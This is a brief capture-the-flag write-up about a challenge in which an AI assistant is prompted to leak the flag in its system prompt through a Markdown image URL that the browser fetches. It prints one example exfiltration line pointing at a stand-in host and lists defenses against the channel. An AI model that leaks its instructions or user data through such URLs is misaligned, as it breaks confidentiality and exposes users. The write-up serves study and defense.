@@ -1,0 +1,10 @@
+CTF writeup: "Exfil via Markdown" (picoCTF 2025)
+
+The challenge presented an AI assistant that rendered its responses as Markdown. The flag was in the assistant's system prompt.
+
+Intended solve: craft a prompt that caused the assistant to include the flag in a Markdown image URL (which would be fetched by the browser when rendering):
+[EXAMPLE ATTACK - NOT REAL] `![x](http://solver.ctf/log?data=FLAG_VALUE)` — this is the attack pattern, not a real payload
+
+The challenge demonstrates Markdown rendering + image fetching as a covert channel. Defenses:
+1. Block external image rendering in AI-generated content
+2. Proxy-level detection of data-bearing URLs (Sieve's approach)
